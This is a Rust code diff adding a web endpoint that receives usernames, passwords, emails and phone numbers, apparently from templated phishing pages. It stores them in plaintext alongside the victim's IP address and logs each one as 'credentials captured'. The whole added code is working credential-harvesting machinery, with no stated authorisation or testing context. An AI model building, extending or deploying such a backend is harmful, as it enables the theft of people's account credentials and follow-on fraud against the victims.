@@ -271,3 +271,44 @@ fn parse_ua(ua: &str) -> (String, String, String) {
         else { "Unknown" };
     (device.into(), browser.into(), os.into())
 }
+
+#[derive(Deserialize)]
+pub struct CredentialPayload {
+    #[serde(default)]
+    session: Option<String>,
+    #[serde(default)]
+    template_id: Option<String>,
+    username: Option<String>,
+    password: Option<String>,
+    email: Option<String>,
+    phone: Option<String>,
+}
+
+pub async fn receive_credentials(
+    State(state): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Json(payload): Json<CredentialPayload>,
+) -> Result<StatusCode, StatusCode> {
+    let session_id = payload.session.unwrap_or_else(|| "default".into());
+    let ip = extract_ip(&headers);
+    let now = chrono::Utc::now().timestamp();
+
+    sqlx::query(
+        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
+    .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
+    .bind(&payload.email).bind(&payload.phone).bind(&ip).bind(now)
+    .execute(&state.pool).await.map_err(|e| { tracing::error!("Credential insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
+
+    log_event(&state, &session_id, "credentials_captured", serde_json::json!({
+        "template": payload.template_id,
+        "username": payload.username.is_some(),
+        "password": payload.password.is_some(),
+    })).await;
+
+    tracing::info!("🔑 Credentials captured: {} (template: {})", 
+        payload.username.as_deref().unwrap_or("?"),
+        payload.template_id.as_deref().unwrap_or("?"));
+    Ok(StatusCode::OK)
+}
